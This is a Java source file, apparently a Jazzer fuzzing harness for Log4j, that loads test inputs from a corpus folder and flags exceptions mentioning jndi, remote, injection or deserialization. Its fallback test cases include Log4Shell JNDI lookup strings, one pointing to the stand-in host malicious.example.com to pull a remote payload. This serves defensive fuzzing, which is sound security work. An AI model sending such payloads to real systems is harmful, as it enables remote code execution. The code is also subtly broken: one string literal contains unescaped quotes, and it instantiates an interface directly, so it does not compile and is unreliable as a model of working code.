package org.example;

import com.code_intelligence.jazzer.api.FuzzedDataProvider;
import com.code_intelligence.jazzer.api.FuzzerSecurityIssueHigh;
import java.io.File;
import java.io.FileReader;
import java.io.BufferedReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class Log4jFuzzerWrapper {
    private static final List<String> TEST_CASES = new ArrayList<>();
    private static final Random RANDOM = new Random();
    
    static {
        // Load test cases from our generated files
        try {
            File corpusDir = new File("llm_fuzzer/generated_tests/corpus");
            if (corpusDir.exists() && corpusDir.isDirectory()) {
                for (File file : corpusDir.listFiles()) {
                    if (file.isFile() && file.getName().endsWith(".txt")) {
                        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                            StringBuilder content = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                content.append(line).append("\n");
                            }
                            TEST_CASES.add(content.toString());
                        }
                    }
                }
                System.out.println("Loaded " + TEST_CASES.size() + " test cases from corpus directory");
            } else {
                System.out.println("Corpus directory not found, using default test cases");
                // Add some default test cases in case our corpus isn't available
                TEST_CASES.add("${jndi:ldap://malicious.example.com/payload}");
                TEST_CASES.add("%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n");
                TEST_CASES.add("{"key": "value", "jndi": "${jndi:rmi://localhost:1099/jndiLookup}"}");
            }
        } catch (IOException e) {
            System.err.println("Error loading test cases: " + e.getMessage());
        }
    }
    
    public static void fuzzerTestOneInput(FuzzedDataProvider data) {
        try {
            // Randomly determine if we should use a predefined test case or generated data
            boolean usePredefined = data.consumeBoolean();
            
            if (usePredefined && !TEST_CASES.isEmpty()) {
                // Use one of our predefined test cases
                int index = data.consumeInt(0, TEST_CASES.size() - 1);
                String testCase = TEST_CASES.get(index);
                
                // Create a new FuzzedDataProvider with our chosen test case data
                byte[] testCaseBytes = testCase.getBytes();
                FuzzedDataProvider wrappedData = new FuzzedDataProvider(testCaseBytes);
                
                // Call the original fuzzer with our data
                Log4jFuzzer.fuzzerTestOneInput(wrappedData);
            } else {
                // Let Jazzer generate data normally
                Log4jFuzzer.fuzzerTestOneInput(data);
            }
        } catch (Exception e) {
            // Report high severity security issues for certain exceptions
            if (isSecurityException(e)) {
                throw new FuzzerSecurityIssueHigh("Potential security issue detected: " + e.getMessage());
            }
            // Otherwise just let the original fuzzer handle the exception
            throw e;
        }
    }
    
    private static boolean isSecurityException(Exception e) {
        // Check for security-relevant exceptions
        String message = e.getMessage() != null ? e.getMessage().toLowerCase() : "";
        return message.contains("jndi") || 
               message.contains("remote") || 
               message.contains("injection") || 
               message.contains("deserialization") ||
               e instanceof SecurityException;
    }
}
